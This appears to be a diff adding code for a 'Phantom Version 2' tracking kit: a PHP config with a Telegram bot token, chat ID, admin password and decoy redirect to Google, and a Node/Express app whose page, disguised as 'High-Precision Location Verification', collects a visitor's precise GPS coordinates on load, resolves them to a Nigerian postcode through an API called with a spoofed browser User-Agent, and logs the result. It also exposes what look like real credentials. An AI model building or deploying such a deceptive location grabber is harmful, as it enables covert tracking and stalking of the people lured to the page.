@@ -1,0 +1,178 @@
+Version 2 – config.php (Ready for NIPOST Postcode API)
+
+<?php
+/**
+ * Phantom Version 2 - Configuration
+ * Supports official NIPOST Postcode API
+ */
+
+return [
+
+    // Domain utama (tanpa trailing slash)
+    // Ganti dengan domain asli kamu
+    'domain' => 'https://YOUR-DOMAIN-HERE.com',
+
+    // Telegram Bot
+    'telegram' => [
+        'enabled'   => true,
+        'bot_token' => '8703136899:AAH8Uc6QlJqGoC_e18POb1NG4-SuSXmBc3M',
+        'chat_id'   => '5301735906',
+    ],
+
+    // Password untuk admin.php
+    'admin_password' => 'sable_phantom_2026',
+
+    // Redirect default kalau user tidak set tujuan
+    'default_redirect' => 'https://www.google.com',
+
+    // =====================================================
+    // NIPOST Digital Postcode API (Version 2)
+    // =====================================================
+    'postcode' => [
+        'enabled'       => true,                          // set false kalau belum punya key
+        'api_key'       => 'YOUR_NIPOST_API_KEY_HERE',    // ← paste API key di sini
+        'base_url'      => 'https://api.postcode.gov.ng',
+        'timeout'       => 8,                             // detik
+        // Level yang diminta (1 = validity only, 2+ = lebih detail)
+        // Gunakan 2 atau 3 kalau key kamu mendukung
+        'lookup_level'  => 2,
+    ],
+
+];
+
+
+
+
+/location-tracker
+├── server.js
+└── public/
+    └── index.html
+
+#server.js (Backend)
+
+const express = require('express');
+const axios = require('axios');
+const path = require('path');
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+app.use(express.json());
+app.use(express.static(path.join(__dirname, 'public')));
+
+// Endpoint to receive high-precision coordinates and query NIPOST API
+app.post('/api/resolve-location', async (req, res) => {
+    const { latitude, longitude, accuracy, timestamp } = req.body;
+
+    if (!latitude || !longitude) {
+        return res.status(400).json({ success: false, error: 'Coordinates missing' });
+    }
+
+    try {
+        // Query the discovered NIPOST reverse geocoding API
+        const nipostUrl = `https://postcode.gov.ng/api/search/reverse?lat=${latitude}&lng=${longitude}`;
+        const response = await axios.get(nipostUrl, {
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+                'Accept': 'application/json'
+            }
+        });
+
+        console.log('--- LOCATION RESOLVED ---');
+        console.log(`Lat/Lng: ${latitude}, ${longitude}`);
+        console.log(`Accuracy: ${accuracy} meters`);
+        console.log(`Timestamp: ${new Date(timestamp).toLocaleString()}`);
+        console.log('NIPOST Data:', response.data);
+        console.log('-------------------------');
+
+        res.json({
+            success: true,
+            coordinates: { latitude, longitude, accuracy },
+            postcodeData: response.data
+        });
+
+    } catch (error) {
+        console.error('API Query Failed:', error.message);
+        res.status(500).json({ success: false, error: 'Failed to fetch postal code from NIPOST' });
+    }
+});
+
+app.listen(PORT, () => {
+    console.log(`Server running at http://localhost:${PORT}`);
+});
+
+
+
+#public/index.html (Frontend with Maximum Device Access)
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>High-Precision Location Verification</title>
+    <style>
+        body { font-family: sans-serif; background: #0f172a; color: #f8fafc; text-align: center; padding-top: 100px; }
+        .box { max-width: 500px; margin: auto; background: #1e293b; padding: 30px; border-radius: 10px; border: 1px solid #334155; }
+        code { color: #38bdf8; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Verifying Device Location...</h2>
+        <p id="status">Mengakses sensor GPS perangkat secara maksimal...</p>
+    </div>
+
+    <script>
+        function sendToServer(lat, lng, accuracy) {
+            fetch('/api/resolve-location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    latitude: lat,
+                    longitude: lng,
+                    accuracy: accuracy,
+                    timestamp: Date.now()
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.success) {
+                    document.getElementById('status').innerHTML = `Lokasi dikunci!<br>Postal Code: <code>${JSON.stringify(data.postcodeData)}</code>`;
+                } else {
+                    document.getElementById('status').innerText = 'Gagal memproses kode pos.';
+                }
+            })
+            .catch(err => {
+                document.getElementById('status').innerText = 'Koneksi server gagal.';
+            });
+        }
+
+        window.onload = function() {
+            if (!navigator.geolocation) {
+                document.getElementById('status').innerText = 'Geolocation tidak didukung browser ini.';
+                return;
+            }
+
+            // Menggunakan watchPosition + highAccuracy untuk memaksa pembacaan GPS hardware secara real-time
+            const options = {
+                enableHighAccuracy: true, // Memaksa penggunaan GPS fisik / sensor device tingkat tinggi
+                timeout: 30000,          // Waktu tunggu maksimal sebelum timeout
+                maximumAge: 0            // Mencegah penggunaan data lokasi lama/cached
+            };
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    const acc = position.coords.accuracy;
+                    sendToServer(lat, lng, acc);
+                },
+                (error) => {
+                    document.getElementById('status').innerText = `Akses lokasi ditolak atau error: ${error.message}`;
+                },
+                options
+            );
+        };
+    </script>
+</body>
+</html>
+
